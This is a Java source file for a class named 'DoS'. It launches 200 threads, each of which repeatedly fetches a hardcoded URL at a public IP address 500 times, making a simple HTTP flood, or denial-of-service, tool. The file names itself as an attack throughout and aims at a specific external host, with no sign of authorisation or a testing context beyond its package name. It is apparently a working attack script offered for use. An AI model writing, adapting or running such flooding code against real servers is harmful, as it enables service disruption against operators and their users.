package kamoru.test.net;
import java.net.*;
import java.io.*;
public class DoS {
	public static int execCount = 0;
	public static int errCount = 0;
	public String targetIP;
	public int	  targetPort;
	public int    attackNo;
	public int	  threadNo;
	public DoS(String ip, int port, int no, int tNo){
		this.targetIP = ip;
		this.targetPort = port;
		this.attackNo = no;
		this.threadNo = tNo;
	}
	
	public void run(){
		ActionThread[] thread = new ActionThread[threadNo];
		for(int i=0; i<threadNo; i++) {
			thread[i] = new ActionThread(targetIP, targetPort, attackNo, "Thread-" + i);
		}
		for(int i=0; i<threadNo; i++) {
			thread[i].start();
		}
		for(int i=0; i<threadNo; i++) {
			try{thread[i].join();}catch(Exception e){e.printStackTrace();}
		}
		System.out.println("\nTotal execution count " + execCount);
		System.out.println("\nTotal error count " + errCount);
	}

	public static void main(String[] args) {
		long s = System.nanoTime();
		String url1 = "http://123.212.190.111/intro";
		String url2 = "http://192.168.8.61:8080/";
		String url3 = "192.168.8.61";
		DoS dos = new DoS(url1, 8080, 500, 200);
		dos.run();
		System.out.println("\nElapsed time : " + (System.nanoTime() - s));
	}

	class ActionThread extends Thread {
		public String targetIP;
		public int	  targetPort;
		public int    attackNo;
		public ActionThread(String ip, int port, int no, String tname){
			super(tname);
			this.targetIP = ip;
			this.targetPort = port;
			this.attackNo = no;
		}
		public void run() {
			for(int i=0; i<attackNo; i++) {
				InputStream is = null;
				BufferedReader reader = null;
				String line = null;
				try {
//					Socket s = new Socket(targetIP, targetPort);
//					is = s.getInputStream();
					URL url = new URL(targetIP);
					reader = new BufferedReader(new InputStreamReader(url.openStream()));
					while ((line = reader.readLine()) != null)
						continue;

					++execCount;
					System.out.print("*");
				} catch(Exception e){
					//e.printStackTrace();
					errCount++;
					System.err.println(this.getName() + " [catch] " + e.getMessage());
				} finally {
					try {
						if(reader != null) reader.close();
					} catch (Exception e) {
						System.err.println(this.getName() + " [finally] " + e.getMessage());
					}
				}
			}
		}
	}
}
